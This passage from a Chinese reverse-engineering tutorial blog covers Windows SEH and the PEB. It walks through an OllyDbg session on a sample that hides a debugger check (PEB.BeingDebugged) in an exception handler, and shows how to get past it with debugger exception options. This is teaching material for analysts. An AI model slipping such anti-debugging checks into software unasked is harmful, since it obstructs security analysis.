src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322123322363.png#crop=0&crop=0&crop=1&crop=1&id=h3XBS&originHeight=709&originWidth=1130&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-15 FS:[0]=SEH链起始地址"></p><p>从代码信息窗口中可以看到，FS:[0]&#x3D;[7FFDF000]&#x3D;12FF78,其中12FF78就是SEH链的起始地址（即EXCEPTION_REGISTRATION_RECORD结构体链表的起始地址）。在上图的栈窗口中查看地址12FF78,可以发现第一个EXCEPTION_REGISTRATION_RECORD结构体（Next&#x3D;12FFC4,Handler&#x3D;402730）。异常处理器地址402730存在于seh.exe进程的代码节区（该异常处理器是VC++生成PE文件时默认添加到其启动函数的，请各位自行查看位于402730地址处的异常处理器代码）。然后转到12FFC4地址处，查看链表中的第二个EXCEPTION_REGISTRATION_RECORD结构体（参考图48-16）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322123522535.png#crop=0&crop=0&crop=1&crop=1&id=MCWa0&originHeight=144&originWidth=422&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-16 最后一个异常处理器"></p><p>从图48-16可以看到，第二个结构体的Next成员值为FFFFFFFF，所以第二个EXCEPTION_REGISTRATION_RECORD结构体也是SEH链表的最后一个结构体。异常处理器地址为7717D74D，它位于ntdll.dll模块的代码区域，是OS的默认异常处理器（创建进程时，OS会自动产生默认的SEH）。</p><h2 id="48-6-2-添加SEH"><a href="#48-6-2-添加SEH" class="headerlink" title="48.6.2 添加SEH"></a>48.6.2 添加SEH</h2><p>运行401005地址处的PUSH DWORD PTRFS:[0]指令（参考图48-15），查看栈窗口，如图48-17所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322123927184.png#crop=0&crop=0&crop=1&crop=1&id=HxbHR&originHeight=61&originWidth=530&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-17 栈窗口"></p><p>栈中新创建了<code>_exception_registration_record</code>结构体。继续执行40100C地址处的<code>MOV DWORD PTR FS:[0],ESP</code>指令（参考图48-15），查看栈窗口，如图48-18所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322124106497.png#crop=0&crop=0&crop=1&crop=1&id=SjdCP&originHeight=61&originWidth=529&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-18 添加新的SEH"></p><p>栈窗口中岀现了新生成的SEH的注释（Next&#x3D;12FF78, Handler&#x3D;40105A）。新的异常处理器（40105A）就这样添加到SEH链。</p><blockquote><p>只看代码48-6会感觉很难，实际调试并查看栈就比较容易理解。</p></blockquote><p>OllyDbg调试器中提供了查看SEH链的功能。在OllyDbg主菜单中依次选择View-SEH Chain项目，即可打开SEH链查看窗口。</p><p>如图48-19所示，在SEH链窗口中可以看到添加在顶端的异常处理器（40105A）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322124210088.png#crop=0&crop=0&crop=1&crop=1&id=u5dId&originHeight=147&originWidth=374&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-19 SEH链查看窗口"></p><h2 id="48-6-3发生异常"><a href="#48-6-3发生异常" class="headerlink" title="48.6.3发生异常"></a>48.6.3发生异常</h2><p>如果执行401019地址处的<code>MOV DWORD PTR DS:[EAX],1</code>指令（参考图48-14），就会引发EXCEPTION_ACCESS_VIOLATION异常（该异常已做说明，此处不再赘述）。此时程序处在调试之中，根据异常处理的顺序，OS会把控制权交给调试器（异常处理器（40105A）未运行）。在40105A地址处设置断点，然后按Shift+F9组合键，再将异常派送给被调试进程（seh.exe），调试器暂停在设置的断点处（40105A）。</p><p>如图48-20所示，被调试者会调用注册在自身SEH链中的异常处理器来处理异常。设置好断点后，接下来即可调试异常处理器。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322124819102.png#crop=0&crop=0&crop=1&crop=1&id=xaX3r&originHeight=183&originWidth=860&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-20 异常处理器(40105A)"></p><h2 id="48-6-4-查看异常处理器参数"><a href="#48-6-4-查看异常处理器参数" class="headerlink" title="48.6.4 查看异常处理器参数"></a>48.6.4 查看异常处理器参数</h2><p>调试SEH时，栈中存储的参数（关于参数的说明请参考代码48-4）如图48-21所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322125045940.png#crop=0&crop=0&crop=1&crop=1&id=ioAQS&originHeight=303&originWidth=808&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-21 调用异常处理器时的栈"></p><p>第一个参数（ESP+4）是指向EXCEPTION_RECORD结构体的指针pReord（12FAC0），查看结构体中的数据，如图48-22所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322125200481.png#crop=0&crop=0&crop=1&crop=1&id=ZPb9N&originHeight=149&originWidth=742&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-22 EXCEPTION_RECORD结构体"></p><p>参考图48-22以及代码48-5中关于EXCEPTION_RECORD结构体的定义可知，ExceptionCode（pRecord+0）为 C0000005（EXCEPTION_ACCESS_VIOLATION）,发生异常的代码地址ExceptionAddress为401019（对照图48-14可知发生异常的代码地址是准确的）。</p><p>第二个参数（ESP+8）是指向EXCEPTION_REGISTRATION_RECORD结构体的指针（pFrame），其值为12FF3C，它是SEH链的起始地址。</p><p>第三个参数（ESP+C）是指向CONTEXT结构体的指针pContext（12FADC），查看指针pContext所指的地址空间。</p><p>如图48-23所示，CONTEXT是一个非常大的结构体（大部分成员的值为NULL）。其中需要特别注意的是Eip成员，它位于从结构体偏移B8的位置，存储着发生异常的代码地址。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322125502882.png#crop=0&crop=0&crop=1&crop=1&id=fXwvz&originHeight=287&originWidth=740&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-23 CONTEXT结构体"></p><p>最后一个参数pValue（ESP+10）供系统内部使用，可以忽略。</p><h2 id="48-6-5调试异常处理器"><a href="#48-6-5调试异常处理器" class="headerlink" title="48.6.5调试异常处理器"></a>48.6.5调试异常处理器</h2><p>40105A地址处的异常处理器（参考图48-20）中存在着调试器检测代码。虽然简单，却是非常具有代表性的反调试代码。下面仔细分析一下。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-number">0040105A</span>      <span class="hljs-number">8B7424</span> <span class="hljs-number">0C</span>     MOV ESI,DWORD PTR SS:[ARG<span class="hljs-number">.3</span>]; ESI = pContext<br></code></pre></td></tr></table></figure><p>[ESP+C]是异常处理器第三个参数pContext的值。以上命令用来将pContext地址（12FC58）传送到ESI寄存器。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">0040105E      <span class="hljs-number">64</span>:A1 <span class="hljs-number">3000000</span> <span class="hljs-keyword">MOV</span> <span class="hljs-built_in">EAX</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">FS</span>:[<span class="hljs-number">30</span>]<span class="hljs-comment">;EAX = address of PEB</span><br></code></pre></td></tr></table></figure><p>上述指令用于将FS:[30]的值传送给EAX寄存器，FS:[30]就是PEB结构体的起始地址（7FFDD000,参考图48-24）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322130256518.png#crop=0&crop=0&crop=1&crop=1&id=RHqCp&originHeight=181&originWidth=866&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-24 PEB的起始地址"></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">00401064 </span>     <span class="hljs-number">8078</span> <span class="hljs-number">02</span> <span class="hljs-number">01</span>    CMP BYTE PTR DS:[EAX+<span class="hljs-number">2</span>],<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>上述指令用于读取[EAX+2]地址中的1个字节值，然后与1比较。由于EAX当前保存着PEB的起始地址，所以[EAX+2]指的是PEB.BeingDebugged成员。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">+<span class="hljs-number">0x000</span> InheritedAddressSpace : UChar<br>+<span class="hljs-number">0x001</span> ReadImageFileExecOptions : UChar<br>+<span class="hljs-number">0x002</span> BeingDebugged    : UChar<br>+<span class="hljs-number">0x003</span> BitField         : UChar<br>+<span class="hljs-number">0x003</span> ImageUsesLargePages : Pos <span class="hljs-number">0</span>, <span class="hljs-number">1</span> Bit<br>+<span class="hljs-number">0x003</span> IsProtectedProcess : Pos <span class="hljs-number">1</span>, <span class="hljs-number">1</span> Bit<br>+<span class="hljs-number">0x003</span> IsLegacyProcess  : Pos <span class="hljs-number">2</span>, <span class="hljs-number">1</span> Bit<br>+<span class="hljs-number">0x003</span> IsImageDynamicallyRelocated : Pos <span class="hljs-number">3</span>, <span class="hljs-number">1</span> Bit<br>+<span class="hljs-number">0x003</span> SkipPatchingUser32Forwarders : Pos <span class="hljs-number">4</span>, <span class="hljs-number">1</span> Bit<br>+<span class="hljs-number">0x003</span> SpareBits        : Pos <span class="hljs-number">5</span>, <span class="hljs-number">3</span> Bits<br>+<span class="hljs-number">0x004</span> Mutant           : Ptr32 Void<br>+<span class="hljs-number">0x008</span> ImageBaseAddress : Ptr32 Void<br>+<span class="hljs-number">0x00c</span> Ldr              : Ptr32 _PEB_LDR_DATA<br>+<span class="hljs-number">0x010</span> ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS<br></code></pre></td></tr></table></figure><p>从图48-25可以看到，[EAX+2]&#x3D;[7FFD7002]&#x3D;PEB.BeingDebugged的值被设置为1，表示进程处于调试状态。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322130531111.png#crop=0&crop=0&crop=1&crop=1&id=K7wV8&originHeight=85&originWidth=741&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-25 PEB.BeingDebugged"></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">00401068 </span>     <span class="hljs-number">75</span> <span class="hljs-number">0</span>C         JNE SHORT <span class="hljs-number">00401076</span><br></code></pre></td></tr></table></figure><p>若上一条CMP命令中的2个比较对象不同，则执行JNZ（Jump if Not Zero）命令跳转。由于PEB.BeingDebugged的值为1,所以不跳转，即不执行该JNZ指令，如图48-26所示</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322130638089.png#crop=0&crop=0&crop=1&crop=1&id=YWRcI&originHeight=208&originWidth=912&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-26 JNZ指令"></p><p>程序非调试运行时，执行此处会跳转到401076地址处。若程序处在调试运行状态，则跳过该JNZ指令，直接执行40106A地址处的指令。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-number">0040106A</span>      C786 B8000000 MOV DWORD PTR DS:[ESI+<span class="hljs-number">0B8</span>],<span class="hljs-number">00401023</span><br></code></pre></td></tr></table></figure><p>由于当前进程处于调试之中，所以会执行上述指令。当前ESI寄存器中保存着CONTEXT结构体的起始地址（pContext&#x3D;12FC58）。从图48-26可知，[ESI+B8]&#x3D;[12FD10]&#x3D;pContext→Eip（当前值为401019）。</p><p>也就是说，上述指令用来将pContext→Eip值更改为401023。异常处理器终止时，发生异常的线程会运行401023地址处的代码。如图48-27所示，401023地址处的代码用来弹岀一个消息框，显示 “Debugger Detected:（” 消息文本。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322130756735.png#crop=0&crop=0&crop=1&crop=1&id=pBxLf&originHeight=105&originWidth=997&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>为了方便调试，在401023地址处设置断点。</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">00401074 </span>     EB <span class="hljs-number">0</span>A         JMP SHORT <span class="hljs-number">00401080</span><br></code></pre></td></tr></table></figure><p>由于pContext→Eip值已经发生改变，所以执行流跳转到异常处理器的终止代码处（401080）。</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">00401076 </span>     C786 B8000000 MOV DWORD PTR DS:[ESI+<span class="hljs-number">0</span>B8],<span class="hljs-number">00401039</span>; Entry <span class="hljs-keyword">point</span><br></code></pre></td></tr></table></figure><blockquote><p>若程序运行在非调试状态下，则执行401068地址处的JNZ指令（参考图48-26）,跳转到401076地址处。如上所示，401076地址处的指令用来将pContext→Eip值更改为401039, 401039地址处的代码用来弹出消息对话框，显示“Hello:）” 消息文本（参 考图48-28）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322131431832.png#crop=0&crop=0&crop=1&crop=1&id=qVMND&originHeight=159&originWidth=989&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-27 401023地址处的代码"></p></blockquote><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">00401080 </span>     <span class="hljs-number">33</span>C0          <span class="hljs-keyword">XOR</span> EAX,EAX<br><span class="hljs-symbol">00401082 </span>     C3            RETN<br></code></pre></td></tr></table></figure><p>最后两条指令中先将返回值（EAX）设置为0，然后异常处理器返回。返回值0代表EXCEPTION_CONTINUE_EXECUTION，表示异常得到处理，相关线程可以继续运行（参考代码48-7）。</p><blockquote><p>本练习示例（seh.exe）的目的在于向各位展示使用SEH进行反调试的技术。所以在代码中故意引发了异常，然后在SEH中根据调试与否修改了运行分支。若熟悉了该技术，调试压缩器&#x2F;保护器类的文件时会非常有帮助。</p></blockquote><p>运行到401082地址处的RETN指令时，控制权被返回至ntdll.dll模块中的代码区域，它属于系统区域，所以在OllyDbg中按F9运行键后，调试会在401023地址处（设置有断点）暂停（参考图48-27）。</p><p>使用StepOver（F8）指令使调试运行到401031地址处的CALL指令，弹出一个消息框。按“确定”按钮关闭消息框后，执行401037地址处的JMP SHORT 40104D指令，跳转到删除SEH的代码处（40104D）。</p><h2 id="48-6-6-删除-SEH"><a href="#48-6-6-删除-SEH" class="headerlink" title="48.6.6 删除 SEH"></a>48.6.6 删除 SEH</h2><p>在程序终止前删除已注册的SEH，如图48-29所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322133242766.png#crop=0&crop=0&crop=1&crop=1&id=Tishk&originHeight=262&originWidth=1085&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-29 删除SEH的代码"></p><p>调试运行到40104D地址处查看栈，EXCEPTION_REGISTRATION_RECORD结构体存储在其中（12FF3C），该结构体是SEH链中最初运行的异常处理器。40104D处的<code>POP DWORD PTR FS:[0]</code>指令用来读取栈值（12FF78），并将其放入FS:[0]。FS:[0]是TEB.NtTib.ExceptionList，12FF78就是下一个SEH的起始地址。执行该命令后，前面注册的SEH（12FF3C）被从SEH链中删除。然后<br>执行401054地址处的<code>ADD ESP,4</code>指令，将栈中的异常处理器地址（40105A）也删除。请各位反复调试，查清栈中数据变化的情况。</p><h1 id="48-7-设置OllyDbg选项"><a href="#48-7-设置OllyDbg选项" class="headerlink" title="48.7 设置OllyDbg选项"></a>48.7 设置OllyDbg选项</h1><p>我们已经学习了SEH的工作原理，并通过练习示例了解了利用SEH进行反调试的技术。本章最重要、最关键的内容概括如下：</p><p>通过处理使被调试者将自身异常首先发送给调试器。</p><p>上述原理作用下，程序在正常运行与调试运行时有不同的分支代码，借助SEH实现的反调试技术非常多，这为代码调试带来诸多不便，使调试更加困难。那么，有没有更方便的调试方法呢？OllyDbg调试器提供了调试选项，调试中的程序发生异常时，调试器不会暂停，会自动将异常派送给被调试者（看上去与正常运行一样）。在OllyDbg的菜单栏中选择Options - Debugging options菜单（快捷键Alt+O），打开Debugging options对话框，如图48-30所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322133602738.png#crop=0&crop=0&crop=1&crop=1&id=lgtHO&originHeight=141&originWidth=328&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-30 Debugging options菜单"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322133538654.png#crop=0&crop=0&crop=1&crop=1&id=eN4xi&originHeight=156&originWidth=274&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p><p>然后在Debugging options对话框中选择Exceptions选项卡。</p><p>如图48-31所示，Exceptions选项卡包含多个选项，下面逐一介绍。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322133649672.png#crop=0&crop=0&crop=1&crop=1&id=J3hfG&originHeight=494&originWidth=614&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-31 Debugging options对话框的Exceptions选项卡"></p><h2 id="48-7-1-忽略KERNEL32中发生的内存非法访问异常"><a href="#48-7-1-忽略KERNEL32中发生的内存非法访问异常" class="headerlink" title="48.7.1 忽略KERNEL32中发生的内存非法访问异常"></a>48.7.1 忽略KERNEL32中发生的内存非法访问异常</h2><p>复选Ignore memory access violations in KERNEL32选项后，kernel32.dll模块中发生的内存非法访问异常都会被忽略（该选项默认处于选中状态，保持不变即可）。</p><h2 id="48-7-2-向被调试者派送异常"><a href="#48-7-2-向被调试者派送异常" class="headerlink" title="48.7.2 向被调试者派送异常"></a>48.7.2 向被调试者派送异常</h2><p>Ignore（pass to program）following exceptions选项下存在多个异常复选框，如图48-32所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322133745157.png#crop=0&crop=0&crop=1&crop=1&id=r63LW&originHeight=163&originWidth=282&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-32 Ignore(pass to program)following exceptions选项"></p><p>Ignore（pass to program）following exceptions选项共有6个异常选项，前5个已经介绍过了。单击左侧复选框选中后，发生相应异常时OllyDbg调试器就会忽略该异常，并且将其派送给被调试者。</p><p>接下来简单介绍All FPU exceptions选项。FPU（Floating Point Unit,浮点运算单元）是专门 用于浮点数运算的处理器，它有一套专用指令，与普通x86指令的形态结构不同。复选All FPU exceptions选项后，处理FPU指令过程发生异常时，调试器会无条件将异常派送给被调试者处理。</p><h2 id="48-7-3其他异常处理"><a href="#48-7-3其他异常处理" class="headerlink" title="48.7.3其他异常处理"></a>48.7.3其他异常处理</h2><p>Exceptions选项卡中还有一个Ignore also following custom exceptions for ranges选项，如图48-31所示。复选该选项后，用户可以直接添加（或删除）其他各种异常，发生这些异常时，调试器会将它们直接派送给被调试者处理。调试时灵活运用OllyDbg的Exceptions选项，可以在不暂停调试器的前提下自动规避使用SEH实现的反调试“花招”，从而继续调试。</p><h2 id="48-7-4简单练习"><a href="#48-7-4简单练习" class="headerlink" title="48.7.4简单练习"></a>48.7.4简单练习</h2><p>首先在OllyDbg调试器中打开seh.exe程序，然后在Exceptions选项卡中进行相应设置，如图48-33所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220322134450871.png#crop=0&crop=0&crop=1&crop=1&id=wegmh&originHeight=495&originWidth=611&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-33 忽略6异常"></p><p>如上设置后，程序在调试运行时发生以上6种异常时，调试器会忽略，将它们直接派送给被调试者。所以seh.exe程序中发生的EXECEPTION_ACCESS_VIOLATION异常会由自身的SEH处 理（调试过程不会暂停）。关闭Debugging options对话框后，按F9运行程序，直接弹岀“Debugger detected:消息框。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220321143549446.png#crop=0&crop=0&crop=1&crop=1&id=MfH3Z&originHeight=215&originWidth=242&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-34 消息框“Debugger detected:(”"></p><p>程序运行过程发生异常时，调试器会将它们派送给被调试者的SEH处理，调试器不会暂停而直接弹出图48-34所示的消息框。通过SEH内部的调试器检测代码（PEB.BeingDebugged）弹出与正常运行时完全不同的消息框（相关解决方法请参考第50章）。</p><blockquote><p>我并未在一开始的时候就介绍OllyDbg调试器的Exceptions选项，而是将它放在本章最后，目的在于先向各位讲解SEH的内部工作原理。不理解内部工作原理，只学习相关工具的使用技巧，就如同在沙滩上建房子一样。SEH用途广泛，若想学好逆向分析技术，必须先掌握SEH的内部工作原理。</p></blockquote><h1 id="48-8小结"><a href="#48-8小结" class="headerlink" title="48.8小结"></a>48.8小结</h1><p>SEH大量应用于压缩器、保护器、恶意程序（Malware）,用来反调试。大家研究与调试SEH的过程中，会进一步加深对Wiondows OS内部结构的认识，提高自身逆向分析技术水平。关于SEH的讲解先到这里，后面的调试练习中还会遇到。</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第47章 PEB</title>
    <link href="/1999/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC47%E7%AB%A0%20PEB/"/>
    <url>/1999/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC47%E7%AB%A0%20PEB/</url>
    
    <content type="html"><![CDATA[<p>第47章 PEB</p><p>本章将学习有关PEB（ Process Environment Block,进程环境块）的知识。PEB与前面学过的TEB都属于高级调试的基础知识，希望大家认真学习，理解并掌握相关概念。</p><h1 id="47-1-PEB"><a href="#47-1-PEB" class="headerlink" title="47.1 PEB"></a>47.1 PEB</h1><p>PEB是存放进程信息的结构体，尺寸非常大，其大部分内容都已被文档化。本章只讲解它的几个重要成员，后面的调试中会经常接触。</p><h2 id="47-1-1-PEB访问方法"><a href="#47-1-1-PEB访问方法" class="headerlink" title="47.1.1 PEB访问方法"></a>47.1.1 PEB访问方法</h2><p>先了解访问PEB结构体的方法。在前面TEB结构体的学习中我们已经知道，TEB.ProcessEnvironmentBlock成员就是PEB结构体的地址。TEB结构体位于FS段选择符所指的段内存的起始地址处，且ProcessEnvironmentBlock成员位于距TEB结构体Offset 30的位置。所以有如下等</p><p>式成立：</p><p>FS:[30] &#x3D; TEB.ProcessEnvironmentBlock &#x3D; address of PEB</p><p>用如下汇编代码表示上述等式：</p><p>方法#1:直接获取PEB地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">MOV EAX, DWORD PTR FS:[30] ; FS[30] = address of PEB<br></code></pre></td></tr></table></figure><p>方法#2:先获取TEB地址，再通过ProcessEnvironmentBlock成员（+30偏移）获取PEB地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">MOV EAX, DWORD PTR FS:[18] ; FS[18] = address of TEB<br>MOV EAX, DWORD PTR DS:[EAX+30] ; DS[EAX+30] = address of PEB<br></code></pre></td></tr></table></figure><p>方法#2是方法# 1的展开形式，它们都引用了TEB.ProcessEnvironmentBlock成员的值。</p><blockquote><p>请注意：下面示例中出现的地址会随用户环境的不同而不同。</p></blockquote><p>接下来使用OllyDbg工具查看PEB结构体。打开Notepad.exe程序后，在EP代码处输入汇编指令（快捷键：Space空格键），如图47-1所示（也可以打开其他任意一个非notepad.exe的程序）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC47%E7%AB%A0%20PEB.assets/image-20220320233433909.png#alt=image-20220320233433909"></p><p>执行上面输入的汇编指令（StepIn（F7）或StepOver（F8）），EAX寄存器中存入FS:[30]的值，即</p><p>PEB结构体的地址，如图47-2所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC47%E7%AB%A0%20PEB.assets/image-20220320233342096.png#alt=image-20220320233342096"></p><p>在Dump窗口中查看该PEB的地址（7FFD6000）,如图47-3所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC47%E7%AB%A0%20PEB.assets/image-20220320233602239.png#alt=image-20220320233602239"></p><p>下面了解PEB结构体各成员。</p><h2 id="47-1-2-PEB结构体的定义"><a href="#47-1-2-PEB结构体的定义" class="headerlink" title="47.1.2 PEB结构体的定义"></a>47.1.2 PEB结构体的定义</h2><p>不同OS下PEB结构体成员略有不同，许多成员都已被文档化。MSDN中关于PEB的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">PEB</span> &#123;</span><br>    BYTE Reserved1[<span class="hljs-number">2</span>];<br>    BYTE BeingDebugged;<br>    BYTE Reserved2[<span class="hljs-number">1</span>];<br>    PVOID Reserved3[<span class="hljs-number">2</span>];<br>    PPEB_LDR_DATA Ldr;<br>    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;<br>    PVOID Reserved4[<span class="hljs-number">3</span>];<br>    PVOID AtlThunkSListPtr;<br>    PVOID Reserved5;<br>    ULONG Reserved6;<br>    PVOID Reserved7;<br>    ULONG Reserved8;<br>    ULONG AtlThunkSListPtr32;<br>    PVOID Reserved9[<span class="hljs-number">45</span>];<br>    BYTE Reserved10[<span class="hljs-number">96</span>];<br>    PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;<br>    BYTE Reserved11[<span class="hljs-number">128</span>];<br>    PVOID Reserved12[<span class="hljs-number">1</span>];<br>    ULONG SessionId;<br>&#125; PEB, *PPEB;<br></code></pre></td></tr></table></figure><p>借助WinDbg调试器可以详细查看PEB结构体成员。</p><h2 id="47-1-3-PEB结构体的成员"><a href="#47-1-3-PEB结构体的成员" class="headerlink" title="47.1.3 PEB结构体的成员"></a>47.1.3 PEB结构体的成员</h2><p>Windows XP SP3下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 